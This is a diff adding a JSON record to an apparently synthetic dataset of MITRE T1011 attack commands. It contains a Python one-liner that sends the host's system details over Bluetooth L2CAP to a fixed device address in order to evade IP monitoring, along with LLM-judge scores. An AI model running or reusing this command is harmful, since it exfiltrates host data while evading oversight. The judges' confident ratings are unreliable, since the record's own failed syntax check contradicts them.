@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
+  "explanation": "Sends host identification over Bluetooth L2CAP PSM 0x1003, bypassing IP-centric monitoring systems per T1011.",
+  "rationale_steps": [
+    "Pick L2CAP to avoid the main IP-based monitoring plane.",
+    "Use a less-common PSM (0x1003) to reduce service collisions.",
+    "Serialize minimal system info and send over L2CAP.",
+    "Close cleanly to prevent lingering connections."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-d365518a",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": false,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes, valid imports, correct socket arguments, and proper statement separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It programmatically sends system identification over a Bluetooth L2CAP socket which can evade IP monitoring, but lacks automation features like scheduling/retry and assumes a reachable listener on the specified PSM.",
+        "combined_score": 4.5,
+        "confidence": 0.83,
+        "timestamp": "2025-10-01T03:25:44.449715Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced parentheses, proper string formatting, correct socket module usage, and valid syntax for creating and using a Bluetooth socket connection.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements automated exfiltration by sending system information over Bluetooth L2CAP (bypassing traditional network monitoring), but it's a single transmission rather than a scheduled/automated process as typically described in T1011.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:25:47.574141Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes, parentheses, and valid Python syntax, making it executable as-is.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by using Python to automate the collection of host information and exfiltrate it over Bluetooth L2CAP, an alternative protocol that bypasses IP-centric monitoring, directly aligning with T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:43:35.683771Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": "mypy issues:\nC:\\Users\\flacman\\AppData\\Local\\Temp\\tmp62xsse_5.py:1: error: Module has no attribute \"BTPROTO_L2CAP\"  [attr-defined]\nFound 1 error in 1 file (checked 1 source file)"
+  }
+}
